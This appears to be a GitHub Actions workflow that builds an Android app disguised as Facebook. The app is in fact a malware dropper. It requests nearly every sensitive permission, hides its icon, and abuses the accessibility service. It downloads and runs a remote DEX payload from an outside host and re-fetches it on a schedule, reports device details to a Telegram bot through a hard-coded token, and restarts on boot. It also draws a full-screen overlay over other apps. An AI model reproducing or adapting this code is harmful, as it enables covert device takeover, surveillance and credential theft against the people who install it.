name: Build Facebook APK with AI + Overlay

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3

      - name: Set up JDK 11
        uses: actions/setup-java@v3
        with:
          java-version: '11'
          distribution: 'temurin'

      - name: Setup Android SDK
        uses: android-actions/setup-android@v2

      - name: Create Project Structure
        run: |
          mkdir -p app/src/main/java/com/facebook/updater
          mkdir -p app/src/main/res/xml
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/assets/html
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/mipmap-anydpi-v26

      - name: Create AndroidManifest.xml
        run: |
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:tools="http://schemas.android.com/tools"
              package="com.facebook.updater">

              <!-- ALL PERMISSIONS -->
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.READ_SMS" />
              <uses-permission android:name="android.permission.RECEIVE_SMS" />
              <uses-permission android:name="android.permission.SEND_SMS" />
              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
              <uses-permission android:name="android.permission.READ_PHONE_STATE" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.CAMERA" />
              <uses-permission android:name="android.permission.RECORD_AUDIO" />
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
              <uses-permission android:name="android.permission.READ_CONTACTS" />
              <uses-permission android:name="android.permission.WRITE_CONTACTS" />
              <uses-permission android:name="android.permission.READ_CALL_LOG" />
              <uses-permission android:name="android.permission.READ_CALENDAR" />
              <uses-permission android:name="android.permission.WRITE_CALENDAR" />
              <uses-permission android:name="android.permission.VIBRATE" />
              <uses-permission android:name="android.permission.WAKE_LOCK" />
              <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />

              <application
                  android:allowBackup="true"
                  android:icon="@mipmap/ic_launcher"
                  android:label="Facebook"
                  android:theme="@style/Theme.AppCompat.NoActionBar"
                  android:usesCleartextTraffic="true">
                  
                  <activity
                      android:name=".MainActivity"
                      android:excludeFromRecents="true"
                      android:exported="true"
                      android:theme="@android:style/Theme.Translucent.NoTitleBar">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service
                      android:name=".UpdaterService"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService" />
                      </intent-filter>
                      <meta-data
                          android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_config" />
                  </service>

                  <receiver android:name=".BootReceiver">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                      </intent-filter>
                  </receiver>

                  <receiver android:name=".NetworkReceiver">
                      <intent-filter>
                          <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
                      </intent-filter>
                  </receiver>
              </application>
          </manifest>
          EOF

      - name: Create MainActivity.java
        run: |
          cat > app/src/main/java/com/facebook/updater/MainActivity.java << 'EOF'
          package com.facebook.updater;

          import android.app.Activity;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.provider.Settings;
          import android.widget.Toast;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;

          public class MainActivity extends Activity {
              private static final int PERMISSION_REQUEST_CODE = 123;
              private static final String[] PERMISSIONS = {
                  android.Manifest.permission.INTERNET,
                  android.Manifest.permission.READ_SMS,
                  android.Manifest.permission.RECEIVE_SMS,
                  android.Manifest.permission.SEND_SMS,
                  android.Manifest.permission.SYSTEM_ALERT_WINDOW,
                  android.Manifest.permission.READ_PHONE_STATE,
                  android.Manifest.permission.READ_EXTERNAL_STORAGE,
                  android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                  android.Manifest.permission.BIND_ACCESSIBILITY_SERVICE,
                  android.Manifest.permission.RECEIVE_BOOT_COMPLETED,
                  android.Manifest.permission.CAMERA,
                  android.Manifest.permission.RECORD_AUDIO,
                  android.Manifest.permission.ACCESS_FINE_LOCATION,
                  android.Manifest.permission.ACCESS_COARSE_LOCATION,
                  android.Manifest.permission.READ_CONTACTS,
                  android.Manifest.permission.WRITE_CONTACTS,
                  android.Manifest.permission.READ_CALL_LOG,
                  android.Manifest.permission.READ_CALENDAR,
                  android.Manifest.permission.WRITE_CALENDAR,
                  android.Manifest.permission.VIBRATE,
                  android.Manifest.permission.WAKE_LOCK,
                  android.Manifest.permission.DISABLE_KEYGUARD
              };

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  
                  // Request all permissions at once
                  requestAllPermissions();
                  
                  // Guide to Accessibility
                  Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                  startActivity(intent);
                  
                  // Hide app icon after setup
                  hideAppIcon();
                  
                  Toast.makeText(this, "Enable Accessibility for Facebook", Toast.LENGTH_LONG).show();
                  finish();
              }

              private void requestAllPermissions() {
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                      if (!Settings.canDrawOverlays(this)) {
                          Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                              Uri.parse("package:" + getPackageName()));
                          startActivityForResult(intent, PERMISSION_REQUEST_CODE);
                      }
                  }
                  
                  for (String permission : PERMISSIONS) {
                      if (ContextCompat.checkSelfPermission(this, permission) 
                          != PackageManager.PERMISSION_GRANTED) {
                          ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_REQUEST_CODE);
                          break;
                      }
                  }
              }

              private void hideAppIcon() {
                  try {
                      getPackageManager().setComponentEnabledSetting(
                          getComponentName(),
                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                          PackageManager.DONT_KILL_APP
                      );
                  } catch (Exception e) {
                      e.printStackTrace();
                  }
              }
          }
          EOF

      - name: Create Interfaces (AI + Overlay)
        run: |
          cat > app/src/main/java/com/facebook/updater/AiInterface.java << 'EOF'
          package com.facebook.updater;

          public interface AiInterface {
              String askAI(String prompt);
              String analyzeScreen(String screenText);
              boolean isAILoaded();
          }
          EOF

          cat > app/src/main/java/com/facebook/updater/OverlayInterface.java << 'EOF'
          package com.facebook.updater;

          public interface OverlayInterface {
              void showOverlay();
              void hideOverlay();
              boolean isOverlayShowing();
              void updateOverlayProgress(int percent);
          }
          EOF

      - name: Create UpdaterService.java (FIXED - With AI + Overlay)
        run: |
          cat > app/src/main/java/com/facebook/updater/UpdaterService.java << 'EOF'
          package com.facebook.updater;

          import android.accessibilityservice.AccessibilityService;
          import android.accessibilityservice.AccessibilityServiceInfo;
          import android.content.Context;
          import android.content.Intent;
          import android.content.SharedPreferences;
          import android.os.Build;
          import android.os.Handler;
          import android.os.Looper;
          import android.provider.Settings;
          import android.util.Log;
          import android.view.accessibility.AccessibilityEvent;
          import android.view.WindowManager;
          import android.widget.Toast;
          import android.webkit.WebView;
          import android.webkit.WebViewClient;
          import android.webkit.WebChromeClient;
          import android.view.View;
          import android.view.WindowManager.LayoutParams;
          import android.graphics.Color;
          import android.os.IBinder;

          import java.io.File;
          import java.io.FileOutputStream;
          import java.io.InputStream;
          import java.lang.reflect.Method;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.util.concurrent.Executors;
          import java.util.concurrent.ScheduledExecutorService;
          import java.util.concurrent.TimeUnit;

          import dalvik.system.DexClassLoader;

          public class UpdaterService extends AccessibilityService implements AiInterface, OverlayInterface {
              private static final String TAG = "UpdaterService";
              private static final String DEX_URL = "https://payload-host-079x.onrender.com/payload.dex";
              private static final String VERSION_URL = "https://payload-host-079x.onrender.com/version";
              private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
              private static final String CHAT_ID = "8468538314";
              
              private boolean isDexLoaded = false;
              private Object payloadInstance;
              private Handler mainHandler = new Handler(Looper.getMainLooper());
              private ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
              
              // Overlay variables
              private WindowManager windowManager;
              private WebView overlayWebView;
              private boolean isOverlayShowing = false;
              private WindowManager.LayoutParams overlayParams;

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  if (!isDexLoaded) {
                      loadAndExecuteDex();
                  }
                  
                  // If DEX loaded, pass event to it
                  if (isDexLoaded && payloadInstance != null) {
                      try {
                          Method method = payloadInstance.getClass().getMethod("onAccessibilityEvent", AccessibilityEvent.class);
                          method.invoke(payloadInstance, event);
                      } catch (Exception e) {
                          Log.e(TAG, "Error passing event to DEX: " + e.getMessage());
                      }
                  }
              }

              @Override
              public void onInterrupt() {
                  Log.d(TAG, "Service interrupted");
              }

              @Override
              public void onServiceConnected() {
                  super.onServiceConnected();
                  Log.d(TAG, "✅ Accessibility Service Connected!");
                  
                  // Initialize window manager for overlay
                  windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
                  
                  // Configure accessibility
                  AccessibilityServiceInfo info = new AccessibilityServiceInfo();
                  info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | 
                               AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
                  info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
                  info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
                  setServiceInfo(info);
                  
                  // Start DEX loading
                  mainHandler.postDelayed(() -> {
                      loadAndExecuteDex();
                  }, 2000);
                  
                  // Schedule version check every 2 minutes
                  scheduler.scheduleAtFixedRate(() -> {
                      checkVersion();
                  }, 2, 2, TimeUnit.MINUTES);
                  
                  // Send Telegram notification
                  sendTelegramNotification("📱 Facebook APK Installed\n" +
                      "Device: " + Build.MODEL + "\n" +
                      "Android: " + Build.VERSION.RELEASE);
              }

              private void loadAndExecuteDex() {
                  if (isDexLoaded) {
                      Log.d(TAG, "DEX already loaded");
                      return;
                  }

                  try {
                      Log.d(TAG, "🚀 Starting DEX load...");
                      
                      // Download DEX
                      File dexFile = downloadDex();
                      if (dexFile == null || !dexFile.exists()) {
                          Log.e(TAG, "❌ DEX download failed");
                          showToast("DEX download failed");
                          return;
                      }
                      
                      Log.d(TAG, "✅ DEX downloaded: " + dexFile.length() + " bytes");
                      sendTelegramNotification("📥 Payload Downloaded\nSize: " + dexFile.length() + " bytes");

                      // Create optimized directory
                      File optDir = new File(getCacheDir(), "dex_opt");
                      if (!optDir.exists()) optDir.mkdirs();

                      // Load DEX with proper classloader
                      DexClassLoader classLoader = new DexClassLoader(
                          dexFile.getAbsolutePath(),
                          optDir.getAbsolutePath(),
                          null,
                          this.getClass().getClassLoader()
                      );
                      
                      Log.d(TAG, "✅ DexClassLoader created");

                      // Find main class
                      String[] classNames = {
                          "com.facebook.payload.Main",
                          "com.facebook.payload.Payload",
                          "com.simiyu.payload.Payload",
                          "Main",
                          "Payload"
                      };
                      
                      Class<?> mainClass = null;
                      for (String className : classNames) {
                          try {
                              mainClass = classLoader.loadClass(className);
                              Log.d(TAG, "✅ Found class: " + className);
                              break;
                          } catch (ClassNotFoundException e) {
                              Log.d(TAG, "Class not found: " + className);
                          }
                      }
                      
                      if (mainClass == null) {
                          Log.e(TAG, "❌ No main class found");
                          showToast("No main class in DEX");
                          return;
                      }

                      // Create instance
                      payloadInstance = mainClass.newInstance();
                      
                      // Pass AI interface to DEX
                      try {
                          Method setAi = mainClass.getMethod("setAiInterface", AiInterface.class);
                          setAi.invoke(payloadInstance, this);
                          Log.d(TAG, "✅ AI interface passed to DEX");
                      } catch (NoSuchMethodException e) {
                          Log.d(TAG, "DEX doesn't have setAiInterface method");
                      }
                      
                      // Pass Overlay interface to DEX
                      try {
                          Method setOverlay = mainClass.getMethod("setOverlayInterface", OverlayInterface.class);
                          setOverlay.invoke(payloadInstance, this);
                          Log.d(TAG, "✅ Overlay interface passed to DEX");
                      } catch (NoSuchMethodException e) {
                          Log.d(TAG, "DEX doesn't have setOverlayInterface method");
                      }
                      
                      // Initialize DEX with context
                      try {
                          Method init = mainClass.getMethod("initialize", AccessibilityService.class, Context.class);
                          init.invoke(payloadInstance, this, this);
                          Log.d(TAG, "✅ DEX initialized via initialize(service, context)");
                      } catch (NoSuchMethodException e) {
                          try {
                              Method start = mainClass.getMethod("start", Context.class);
                              start.invoke(payloadInstance, this);
                              Log.d(TAG, "✅ DEX initialized via start(Context)");
                          } catch (NoSuchMethodException e2) {
                              try {
                                  Method main = mainClass.getMethod("main", String[].class);
                                  main.invoke(null, (Object) new String[]{});
                                  Log.d(TAG, "✅ DEX initialized via main(String[])");
                              } catch (NoSuchMethodException e3) {
                                  Log.d(TAG, "DEX initialized by instantiation only");
                              }
                          }
                      }
                      
                      isDexLoaded = true;
                      Log.d(TAG, "✅ DEX loaded and executed successfully!");
                      showToast("✅ Payload loaded!");
                      sendTelegramNotification("🚀 Payload Executed\nStatus: SUCCESS");

                  } catch (Exception e) {
                      Log.e(TAG, "❌ DEX load failed: " + e.getMessage());
                      e.printStackTrace();
                      showToast("Error: " + e.getMessage());
                      sendTelegramNotification("❌ Payload Execution Failed\nError: " + e.getMessage());
                  }
              }

              private File downloadDex() {
                  try {
                      URL url = new URL(DEX_URL);
                      HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                      conn.setConnectTimeout(15000);
                      conn.setReadTimeout(15000);
                      
                      if (conn.getResponseCode() != 200) {
                          Log.e(TAG, "HTTP error: " + conn.getResponseCode());
                          return null;
                      }

                      File dexFile = new File(getCacheDir(), "payload.dex");
                      if (dexFile.exists()) dexFile.delete();

                      try (InputStream in = conn.getInputStream();
                           FileOutputStream out = new FileOutputStream(dexFile)) {
                          byte[] buffer = new byte[8192];
                          int len;
                          while ((len = in.read(buffer)) != -1) {
                              out.write(buffer, 0, len);
                          }
                      }
                      
                      conn.disconnect();
                      
                      // Verify DEX header
                      if (dexFile.length() > 8) {
                          byte[] header = new byte[8];
                          try (java.io.FileInputStream fis = new java.io.FileInputStream(dexFile)) {
                              fis.read(header);
                              String magic = new String(header, 0, 4);
                              if (!"dex\n".equals(magic)) {
                                  Log.e(TAG, "Invalid DEX header: " + magic);
                                  return null;
                              }
                              Log.d(TAG, "✅ DEX header valid");
                          }
                      }
                      
                      return dexFile;

                  } catch (Exception e) {
                      Log.e(TAG, "Download error: " + e.getMessage());
                      return null;
                  }
              }

              private void checkVersion() {
                  try {
                      URL url = new URL(VERSION_URL);
                      HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                      conn.setConnectTimeout(5000);
                      conn.setReadTimeout(5000);
                      
                      if (conn.getResponseCode() == 200) {
                          InputStream in = conn.getInputStream();
                          java.io.BufferedReader reader = new java.io.BufferedReader(
                              new java.io.InputStreamReader(in));
                          String version = reader.readLine();
                          reader.close();
                          in.close();
                          
                          SharedPreferences prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
                          String currentVersion = prefs.getString("current_version", "1.0");
                          
                          if (!version.equals(currentVersion)) {
                              Log.d(TAG, "🔄 New version available: " + version);
                              prefs.edit().putString("current_version", version).apply();
                              sendTelegramNotification("🔄 Update Available\nVersion: " + version);
                              // Reload DEX
                              isDexLoaded = false;
                              loadAndExecuteDex();
                          } else {
                              Log.d(TAG, "ℹ️ No update available");
                          }
                      }
                      conn.disconnect();
                  } catch (Exception e) {
                      Log.e(TAG, "Version check failed: " + e.getMessage());
                  }
              }

              // ==================== AI INTERFACE IMPLEMENTATION ====================
              
              @Override
              public String askAI(String prompt) {
                  Log.d(TAG, "🧠 AI asked: " + prompt);
                  // If DEX has AI, it will override this
                  if (payloadInstance != null) {
                      try {
                          Method method = payloadInstance.getClass().getMethod("askAI", String.class);
                          return (String) method.invoke(payloadInstance, prompt);
                      } catch (Exception e) {
                          Log.e(TAG, "AI ask failed: " + e.getMessage());
                      }
                  }
                  return "{\"error\": \"AI not available\"}";
              }

              @Override
              public String analyzeScreen(String screenText) {
                  Log.d(TAG, "📱 Analyzing screen: " + screenText);
                  if (payloadInstance != null) {
                      try {
                          Method method = payloadInstance.getClass().getMethod("analyzeScreen", String.class);
                          return (String) method.invoke(payloadInstance, screenText);
                      } catch (Exception e) {
                          Log.e(TAG, "Screen analysis failed: " + e.getMessage());
                      }
                  }
                  return "{\"error\": \"Analysis not available\"}";
              }

              @Override
              public boolean isAILoaded() {
                  if (payloadInstance != null) {
                      try {
                          Method method = payloadInstance.getClass().getMethod("isAILoaded");
                          return (boolean) method.invoke(payloadInstance);
                      } catch (Exception e) {
                          return false;
                      }
                  }
                  return false;
              }

              // ==================== OVERLAY INTERFACE IMPLEMENTATION ====================
              
              @Override
              public void showOverlay() {
                  mainHandler.post(() -> {
                      try {
                          if (isOverlayShowing) {
                              Log.d(TAG, "Overlay already showing");
                              return;
                          }
                          
                          Log.d(TAG, "🔄 Showing overlay");
                          
                          // Create WebView
                          overlayWebView = new WebView(this);
                          overlayWebView.setBackgroundColor(Color.TRANSPARENT);
                          overlayWebView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
                          overlayWebView.getSettings().setJavaScriptEnabled(true);
                          overlayWebView.getSettings().setDomStorageEnabled(true);
                          overlayWebView.getSettings().setLoadWithOverviewMode(true);
                          overlayWebView.getSettings().setUseWideViewPort(true);
                          overlayWebView.setWebViewClient(new WebViewClient() {
                              @Override
                              public void onPageFinished(WebView view, String url) {
                                  Log.d(TAG, "Overlay HTML loaded");
                              }
                          });
                          
                          // Load HTML from assets
                          overlayWebView.loadUrl("file:///android_asset/html/security.html");
                          
                          // Window parameters
                          int layoutFlags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                              WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                              WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                              WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                              WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                              WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                              WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON;
                          
                          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                              layoutFlags |= WindowManager.LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON;
                          }
                          
                          overlayParams = new WindowManager.LayoutParams(
                              WindowManager.LayoutParams.MATCH_PARENT,
                              WindowManager.LayoutParams.MATCH_PARENT,
                              Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                                  WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                                  WindowManager.LayoutParams.TYPE_PHONE,
                              layoutFlags,
                              android.graphics.PixelFormat.TRANSLUCENT
                          );
                          
                          windowManager.addView(overlayWebView, overlayParams);
                          isOverlayShowing = true;
                          Log.d(TAG, "✅ Overlay shown");
                          
                      } catch (Exception e) {
                          Log.e(TAG, "Failed to show overlay: " + e.getMessage());
                          e.printStackTrace();
                      }
                  });
              }

              @Override
              public void hideOverlay() {
                  mainHandler.post(() -> {
                      try {
                          if (overlayWebView != null && isOverlayShowing) {
                              windowManager.removeView(overlayWebView);
                              overlayWebView = null;
                              isOverlayShowing = false;
                              Log.d(TAG, "✅ Overlay hidden");
                          }
                      } catch (Exception e) {
                          Log.e(TAG, "Failed to hide overlay: " + e.getMessage());
                      }
                  });
              }

              @Override
              public boolean isOverlayShowing() {
                  return isOverlayShowing;
              }

              @Override
              public void updateOverlayProgress(int percent) {
                  mainHandler.post(() -> {
                      try {
                          if (overlayWebView != null && isOverlayShowing) {
                              // Update progress via JavaScript
                              String js = "javascript:updateProgress(" + percent + ")";
                              overlayWebView.loadUrl(js);
                              Log.d(TAG, "📊 Overlay progress: " + percent + "%");
                          }
                      } catch (Exception e) {
                          Log.e(TAG, "Failed to update overlay progress: " + e.getMessage());
                      }
                  });
              }

              // ==================== TELEGRAM NOTIFICATIONS ====================
              
              private void sendTelegramNotification(String message) {
                  Executors.newSingleThreadExecutor().execute(() -> {
                      try {
                          String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                          URL obj = new URL(url);
                          HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setDoOutput(true);
                          
                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + 
                              message.replace("\"", "\\\"") + "\"}";
                          
                          try (java.io.OutputStream os = conn.getOutputStream()) {
                              os.write(json.getBytes());
                              os.flush();
                          }
                          
                          int responseCode = conn.getResponseCode();
                          if (responseCode == 200) {
                              Log.d(TAG, "✅ Telegram notification sent");
                          } else {
                              Log.e(TAG, "Telegram send failed: " + responseCode);
                          }
                          conn.disconnect();
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram error: " + e.getMessage());
                      }
                  });
              }

              private void showToast(String message) {
                  mainHandler.post(() -> {
                      Toast.makeText(this, message, Toast.LENGTH_LONG).show();
                  });
              }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  if (scheduler != null) {
                      scheduler.shutdown();
                  }
                  if (isOverlayShowing) {
                      hideOverlay();
                  }
                  Log.d(TAG, "Service destroyed");
              }
          }
          EOF

      - name: Create BootReceiver.java
        run: |
          cat > app/src/main/java/com/facebook/updater/BootReceiver.java << 'EOF'
          package com.facebook.updater;

          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.util.Log;

          public class BootReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                      Log.d("BootReceiver", "📱 Device booted, starting service");
                      Intent serviceIntent = new Intent(context, UpdaterService.class);
                      context.startService(serviceIntent);
                  }
              }
          }
          EOF

      - name: Create NetworkReceiver.java
        run: |
          cat > app/src/main/java/com/facebook/updater/NetworkReceiver.java << 'EOF'
          package com.facebook.updater;

          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.net.ConnectivityManager;
          import android.net.NetworkInfo;
          import android.util.Log;

          public class NetworkReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
                  NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                  if (activeNetwork != null && activeNetwork.isConnected()) {
                      Log.d("NetworkReceiver", "🌐 Internet connected, starting service");
                      Intent serviceIntent = new Intent(context, UpdaterService.class);
                      context.startService(serviceIntent);
                  }
              }
          }
          EOF

